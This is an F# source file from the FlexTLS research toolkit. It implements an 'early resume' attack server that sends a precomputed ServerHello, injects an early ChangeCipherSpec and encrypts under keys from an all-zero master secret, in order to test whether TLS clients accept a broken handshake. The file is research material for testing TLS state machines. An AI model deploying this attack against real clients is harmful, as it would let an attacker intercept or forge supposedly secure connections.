(*
 * Copyright 2015 INRIA and Microsoft Corporation
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *     http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *)

#light "off"

module FlexApps.Attack_EarlyResume

open Bytes
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexRecord
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets
open FlexHandshake

open System

let fromHex (s:string) =
  s
  |> Seq.windowed 2
  |> Seq.mapi (fun i j -> (i,j))
  |> Seq.filter (fun (i,j) -> i % 2=0)
  |> Seq.map (fun (_,j) -> Byte.Parse(new System.String(j),System.Globalization.NumberStyles.AllowHexSpecifier))
  |> Array.ofSeq

// with sid
//let shs = "02000051030154647E725994C1AF4F5C96FB7C5A83F4094E935BC884A03ECAC7178B883FCC1420B963BE87EEA6FA2562C4ECCF50DC97B2E1C9B07AC2CCBF28F976984D088E1A99002F000009FF0100010000230000"
// without sid
let shs = "02000031030154647E725994C1AF4F5C96FB7C5A83F4094E935BC884A03ECAC7178B883FCC1400002F000009FF0100010000230000"

let shb = abytes (fromHex shs)
let srandb = abytes (fromHex "54647E725994C1AF4F5C96FB7C5A83F4094E935BC884A03ECAC7178B883FCC14")

let sticks = "0400000B0000AAAA00051122334455"
let stickb = abytes (fromHex sticks)

type Attack_EarlyResume =
    class

    static member server (listen_addr:string, listen_cert:string, ?listen_port:int) : state =
        let listen_port = defaultArg listen_port FlexConstants.defaultTCPPort in

        // Accept TCP connection from client
        let st,_ = FlexConnection.serverOpenTcpConnection(listen_addr,listen_cert,listen_port) in

        let st,nsc,fch = FlexClientHello.receive(st) in
        //let fsh = {FlexConstants.nullFServerHello with
        //           pv=Some(TLS_1p0); ciphersuite=Some(TLS_RSA_WITH_AES_128_CBC_SHA)} in
        //let st,nsc,fsh = FlexServerHello.send(st,fch,nsc,fsh) in

        // Send precomputed server hello...
        let st = FlexHandshake.send(st,shb) in
        // ... and manually set the next security context
        let si = {nsc.si with
            sessionID        = empty_bytes;
            protocol_version = TLS_1p0;
            cipher_suite     = TLSConstants.cipherSuite_of_name TLS_RSA_WITH_AES_128_CBC_SHA;
            compression      = NullCompression;
            extensions       = FlexConstants.nullNegotiatedExtensions;
            init_srand       = srandb;
        } in
        let nsc = {nsc with si = si; srand = srandb} in
        // Send precomputed session ticket
        //let st = FlexHandshake.send(st,stickb) in

        // Inject early CCS and start encrypting early
        let st,_         = FlexCCS.send(st) in

        // We fill the master secret with zeros because it has no data from the KEX yet
        // Then we compute and install the writing secrets
        let epk = { nsc.secrets with ms = (Bytes.createBytes 48 0)} in
        let nsc = { nsc with secrets = epk} in
        let nsc = FlexSecrets.fillSecrets(st,Server,nsc) in
        let st  = FlexState.installWriteKeys st nsc in

        let st,ffS       = FlexFinished.send(st,nsc,role=Server) in
        let st,_,_       = FlexCCS.receive(st) in

        // Start decrypting
        let st           = FlexState.installReadKeys st nsc in

        let st,ffC       = FlexFinished.receive(st,nsc,Client) in
        st

    end
